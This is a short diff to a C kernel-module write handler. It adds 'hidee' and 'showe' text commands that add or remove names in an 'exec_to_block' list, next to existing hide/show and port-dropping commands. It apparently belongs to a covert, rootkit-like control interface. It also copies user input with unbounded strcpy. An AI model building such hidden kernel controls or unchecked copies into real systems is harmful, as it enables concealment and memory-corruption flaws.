@@ -60,6 +60,12 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             insert_node(&ports_to_drop, last_data);
         }
     }
+    if(memcmp("hidee ", tmpdata, strlen("hidee ")) == 0){
+        if(strlen(tmpdata) > strlen("hidee ")){
+            strcpy(last_data, tmpdata + strlen("hidee "));
+            insert_node(&exec_to_block, last_data);
+        }
+    }
     if(memcmp("show ", tmpdata, strlen("show ")) == 0){
         if(strlen(tmpdata) > strlen("show ") + 3){
             strcpy(last_data, tmpdata + strlen("show "));
@@ -88,6 +94,12 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("showpd ")){
             strcpy(last_data, tmpdata + strlen("showpd "));
             remove_node_by_name(&ports_to_drop, last_data);
+        }
+    }
+    if(memcmp("showe ", tmpdata, strlen("showe ")) == 0){
+        if(strlen(tmpdata) > strlen("showe ")){
+            strcpy(last_data, tmpdata + strlen("showe "));
+            remove_node_by_name(&exec_to_block, last_data);
         }
     }
     return 0;
